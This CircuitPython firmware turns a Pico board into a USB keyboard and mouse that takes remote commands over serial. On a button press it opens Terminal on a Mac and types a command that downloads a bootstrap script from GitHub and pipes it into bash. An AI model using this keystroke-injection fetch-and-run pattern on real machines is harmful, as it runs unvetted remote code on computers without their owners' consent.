from typing import Sequence
import time

import board  # type: ignore
import digitalio  # type: ignore
import usb_hid  # type: ignore
import usb_cdc  # type: ignore
from adafruit_hid.keyboard import Keyboard  # type: ignore
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS  # type: ignore
from adafruit_hid.keycode import Keycode  # type: ignore
from adafruit_hid.mouse_abs import Mouse  # type: ignore
import pwmio  # type: ignore

# in an effort to display full transparency, I used AI for all of the hardware-specific stuff bc I'm not going to dig through the documentation tbh
# and so yeah I'll have to run it and bugsquash once I have hardware to run it on.

MAGIC_SEQUENCE = b"\x4a\x42\x67\x41"
BOOTSTRAP_URL = "https://raw.githubusercontent.com/JBlitzar/picoducky/refs/heads/main/cc-src/bootstrap.sh"

# LEDs
red_pwm = pwmio.PWMOut(board.GP19, frequency=1000, duty_cycle=0)
green_pwm = pwmio.PWMOut(board.GP20, frequency=1000, duty_cycle=0)
blue_pwm = pwmio.PWMOut(board.GP21, frequency=1000, duty_cycle=0)


# Button
button = digitalio.DigitalInOut(board.GP17)
button.direction = digitalio.Direction.INPUT
button.pull = digitalio.Pull.UP

# HID devices
keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(keyboard)
mouse = Mouse(usb_hid.devices)


_mx = 0
_my = 0


def _send_abs_mouse(x: int | None = None, y: int | None = None, wheel: int = 0) -> None:
    global _mx, _my
    if x is None:
        x = _mx
    if y is None:
        y = _my
    print("Would send abs mouse...", x, y, wheel)
    mouse.move(x, y, wheel)
    _mx = x
    _my = y


def set_color(r, g, b):
    red_pwm.duty_cycle = int((r / 255) * 65535)
    green_pwm.duty_cycle = int((g / 255) * 65535)
    blue_pwm.duty_cycle = int((b / 255) * 65535)


SYM_TO_MOD = {
    "⌘": Keycode.GUI,
    "⇧": Keycode.SHIFT,
    "⌥": Keycode.ALT,
    "⌃": Keycode.CONTROL,
}


def _char_to_keycode(ch: str) -> int | None:
    if len(ch) != 1:
        return None
    if "A" <= ch <= "Z":
        return getattr(Keycode, ch)
    if "a" <= ch <= "z":
        return getattr(Keycode, ch.upper())
    if ch == "0":
        return Keycode.ZERO
    if ch == "1":
        return Keycode.ONE
    if ch == "2":
        return Keycode.TWO
    if ch == "3":
        return Keycode.THREE
    if ch == "4":
        return Keycode.FOUR
    if ch == "5":
        return Keycode.FIVE
    if ch == "6":
        return Keycode.SIX
    if ch == "7":
        return Keycode.SEVEN
    if ch == "8":
        return Keycode.EIGHT
    if ch == "9":
        return Keycode.NINE
    if ch == " ":
        return Keycode.SPACEBAR
    if ch == ",":
        return Keycode.COMMA
    if ch == ".":
        return Keycode.PERIOD
    if ch == "-":
        return Keycode.MINUS
    return None


def type_sequence(seq: Sequence[str]) -> None:
    for token in seq:
        mods: list[int] = []
        enter = False
        chars: list[str] = []
        for ch in token:
            if ch in SYM_TO_MOD:
                mods.append(SYM_TO_MOD[ch])
            elif ch == "↩︎":
                enter = True
            else:
                chars.append(ch)

        if enter:
            if mods:
                keyboard.press(*mods, Keycode.ENTER)
                keyboard.release_all()
            else:
                keyboard.press(Keycode.ENTER)
                keyboard.release_all()
            time.sleep(0.03)
            continue

        if mods and chars:
            for ch in chars:
                kc = _char_to_keycode(ch)
                if kc is None:
                    continue
                keyboard.press(*mods, kc)
                keyboard.release_all()
                time.sleep(0.02)
            continue

        if not mods and chars:
            layout.write("".join(chars))
            time.sleep(0.02)


def on_receive_usb_data(data: bytes) -> None:
    if not data.startswith(MAGIC_SEQUENCE):
        return
    try:
        payload = data[len(MAGIC_SEQUENCE) :].decode("utf-8")
    except Exception:
        return
    parts = payload.split(";")
    if not parts:
        return
    cmd = parts[0]
    if cmd == "mouse" and len(parts) > 1:
        try:
            sx, sy = parts[1].split(",")
            tx, ty = int(sx), int(sy)
            _send_abs_mouse(tx, ty, 0)
        except Exception:
            pass
    elif cmd == "mouseclick" and len(parts) > 1:
        try:
            btn, pressed = parts[1].split(",")
            mask = 0
            if btn in ("1", "left", "LEFT"):
                mask = Mouse.LEFT_BUTTON
            elif btn in ("2", "middle", "MIDDLE"):
                mask = Mouse.MIDDLE_BUTTON
            elif btn in ("3", "right", "RIGHT"):
                mask = Mouse.RIGHT_BUTTON

            if pressed == "1":
                mouse.press(mask)
            else:
                mouse.release(mask)
        except Exception:
            pass
    elif cmd in ("mousewheel", "wheel") and len(parts) > 1:
        try:
            delta = int(parts[1])
            _send_abs_mouse(None, None, delta)
        except Exception:
            pass
    elif cmd == "type" and len(parts) > 1:
        sequence = "".join(parts[1:]).split(",,")
        type_sequence(sequence)


_usb_buf = bytearray()


def _read_usb_poll() -> None:
    if usb_cdc is None or not hasattr(usb_cdc, "data"):
        return
    try:
        n = usb_cdc.data.in_waiting
        if n:
            chunk = usb_cdc.data.read(n)
            if chunk:
                _usb_buf.extend(chunk)
        while True:
            nl = _usb_buf.find(b"\n")
            if nl == -1:
                break
            pkt = bytes(_usb_buf[:nl])
            del _usb_buf[: nl + 1]
            on_receive_usb_data(pkt)
        if _usb_buf.startswith(MAGIC_SEQUENCE) and b";" in _usb_buf:
            on_receive_usb_data(bytes(_usb_buf))
            _usb_buf.clear()
    except Exception:
        pass


def main() -> None:
    last_button = button.value
    t0 = time.monotonic()

    while True:
        _read_usb_poll()

        cur = button.value
        if not cur and last_button:
            # Open Spotlight, then Terminal
            type_sequence(["⌘ "])
            time.sleep(0.25)
            type_sequence(["terminal", "↩︎"])
            time.sleep(0.25)
            # Run bootstrap
            cmd = f"curl -sSL {BOOTSTRAP_URL} | bash"
            type_sequence([cmd, "↩︎"])

        last_button = cur

        if time.monotonic() - t0 > 5:
            t0 = time.monotonic()


if __name__ == "__main__":
    main()
